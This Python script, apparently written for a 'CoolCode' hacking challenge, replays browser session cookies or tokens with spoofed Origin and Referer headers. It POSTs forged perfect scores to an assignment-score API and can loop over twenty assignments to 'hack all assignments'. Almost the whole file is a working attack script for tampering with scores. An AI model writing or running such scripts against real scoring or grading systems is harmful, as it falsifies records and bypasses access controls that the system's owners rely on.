#!/usr/bin/env python3
"""
Authenticated CoolCode API Tester
Use this after you find the authentication method from browser dev tools
"""

import requests
import json

def test_with_auth():
    """Test the API with authentication details"""
    
    print("🔐 Authenticated CoolCode API Tester 🔐")
    print("=" * 50)
    
    # Configuration
    username = "CX8de3ce71-3cbTY"
    api_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score"
    
    print("📋 Instructions:")
    print("1. Login to CoolCode UI in your browser")
    print("2. Open Dev Tools (F12) > Network tab")
    print("3. Look for legitimate API requests")
    print("4. Copy authentication details below")
    print("=" * 50)
    
    # Get authentication details from user
    print("\n🔑 Enter authentication details:")
    
    auth_method = input("Auth method (cookie/bearer/header): ").strip().lower()
    
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    if auth_method == "cookie":
        cookie_value = input("Enter cookie value: ").strip()
        headers["Cookie"] = cookie_value
        
    elif auth_method == "bearer":
        token = input("Enter bearer token: ").strip()
        headers["Authorization"] = f"Bearer {token}"
        
    elif auth_method == "header":
        header_name = input("Enter header name: ").strip()
        header_value = input("Enter header value: ").strip()
        headers[header_name] = header_value
    
    # Additional headers
    csrf_token = input("Enter CSRF token (optional): ").strip()
    if csrf_token:
        headers["X-CSRF-Token"] = csrf_token
    
    referer = input("Enter Referer URL (optional): ").strip()
    if referer:
        headers["Referer"] = referer
    
    origin = input("Enter Origin URL (optional): ").strip() 
    if origin:
        headers["Origin"] = origin
    else:
        headers["Origin"] = "https://coolcode-hacker-34c5455cd908.herokuapp.com"
        headers["Referer"] = "https://coolcode-hacker-34c5455cd908.herokuapp.com/ui/"
    
    print("\n" + "=" * 50)
    print("🚀 Testing API with authentication...")
    print(f"Headers: {json.dumps(headers, indent=2)}")
    print("=" * 50)
    
    # Test payload
    payload = {
        "username": username,
        "assignmentId": 1,
        "score": 100
    }
    
    try:
        response = requests.post(
            api_url,
            json=payload,
            headers=headers,
            timeout=10
        )
        
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 200:
            print("\n🎉 SUCCESS! Authentication works!")
            
            # Try to hack all assignments
            hack_all = input("\nHack all assignments 1-20? (y/n): ").strip().lower()
            if hack_all == 'y':
                print("🚀 Hacking all assignments...")
                
                successful = []
                for assignment_id in range(1, 21):
                    test_payload = {
                        "username": username,
                        "assignmentId": assignment_id,
                        "score": 100
                    }
                    
                    try:
                        response = requests.post(
                            api_url,
                            json=test_payload,
                            headers=headers,
                            timeout=5
                        )
                        
                        if response.status_code == 200:
                            print(f"✅ Assignment {assignment_id}: SUCCESS")
                            successful.append(assignment_id)
                        else:
                            print(f"❌ Assignment {assignment_id}: {response.status_code}")
                            
                    except Exception as e:
                        print(f"💥 Assignment {assignment_id}: {e}")
                
                print(f"\n🎯 Hacked {len(successful)}/20 assignments!")
                if successful:
                    print(f"✅ Successful: {successful}")
                    print("🎉 CHALLENGE COMPLETED!")
        
        elif response.status_code == 403:
            print("❌ Still getting 403 Forbidden")
            print("💡 Check if you copied all required headers/cookies")
            
        elif response.status_code == 401:
            print("❌ 401 Unauthorized")
            print("💡 Authentication method might be wrong")
            
        else:
            print(f"❓ Unexpected status: {response.status_code}")
            
    except Exception as e:
        print(f"💥 Request failed: {e}")

def quick_cookie_test():
    """Quick test with just session cookies"""
    
    print("🍪 Quick Cookie Test 🍪")
    print("Copy your session cookies from browser dev tools")
    
    cookies = input("Enter cookies (format: name1=value1; name2=value2): ").strip()
    
    if not cookies:
        print("❌ No cookies provided")
        return
    
    headers = {
        "Content-Type": "application/json",
        "Cookie": cookies,
        "Origin": "https://coolcode-hacker-34c5455cd908.herokuapp.com",
        "Referer": "https://coolcode-hacker-34c5455cd908.herokuapp.com/ui/"
    }
    
    payload = {
        "username": "CX8de3ce71-3cbTY",
        "assignmentId": 1,
        "score": 100
    }
    
    try:
        response = requests.post(
            "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score",
            json=payload,
            headers=headers,
            timeout=10
        )
        
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 200:
            print("🎉 Cookie authentication works!")
        else:
            print("❌ Cookie authentication failed")
            
    except Exception as e:
        print(f"💥 Error: {e}")

def main():
    print("Choose test method:")
    print("1. Full authentication test")
    print("2. Quick cookie test")
    
    choice = input("Enter choice (1 or 2): ").strip()
    
    if choice == "1":
        test_with_auth()
    elif choice == "2":
        quick_cookie_test()
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()
